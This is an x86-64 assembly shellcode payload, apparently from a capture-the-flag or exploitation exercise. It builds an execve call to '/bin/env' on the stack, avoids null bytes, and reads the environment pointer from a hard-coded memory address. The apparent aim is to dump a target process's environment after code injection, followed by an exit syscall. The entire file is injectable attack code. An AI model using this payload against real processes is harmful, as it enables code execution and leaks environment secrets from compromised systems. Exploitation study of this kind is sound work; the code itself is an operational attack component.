          bits 64
            ; find out where we are
start:     ; your code starts here

  ; Clears the registers `rax`, `rdi`, `rsi`, and `rdx` (sets them to 0)
  xor rax, rax
  xor rdi, rdi
  xor rsi, rsi
  xor rdx, rdx

  push rax                ; Push NULL terminator onto the stack
  mov rdi, '/bin/env'     ; Loads the address of the string `/bin/env` into `rdi`
  push rdi                ; Push `/bin/env` onto the stack

  mov rdi, rsp            ; Sets `rdi` to point to the top of the stack

  push rax                ; Pushes a NULL pointer the stack
  push rdi                ; Pushes the address of `/bin/env` onto the stack

  mov rsi, rsp            ; Sets `rsi` to point to the top of the stack
  
  xor rdx, rdx            ; Clears `rdx`

  mov dx, 0x7fff          ; Sets `rdx` to 0x7fff

  shl rdx, 32             ; Shifts `rdx` left by 32 bits

  mov ecx, 0xf7fbe6ff     ; load 0xf7fbe6ff into the low 32 bits of the c register

  ; Clears the low 8 bits of `rcx`
  shr rcx, 8              ; Shifts `rcx` right by 8 bits
  shl rcx, 8              ; Shifts `rcx` left by 8 bits

  or rdx, rcx         

  mov rdx, [rdx]          ; Sets `rdx` to the value at the address stored in `rdx`

  xor rax, rax            ; Clears `rax`
  mov al, 0x3b            ; syscall number for execve

  syscall                 ; Calls the syscall

  mov rdi, rax            ; Sets `rdi` to the return value of the syscall
  xor rax, rax            ; Clears `rax`
  mov al, 0x3c            ; syscall number for exit
  syscall                 ; Calls the syscall

  ; Padding so that the stack doesn't iverflow the code
  dq 0xffffffffffffffff   
  dq 0xffffffffffffffff
  dq 0xffffffffffffffff
  dq 0xffffffffffffffff


end:
  dd end-start
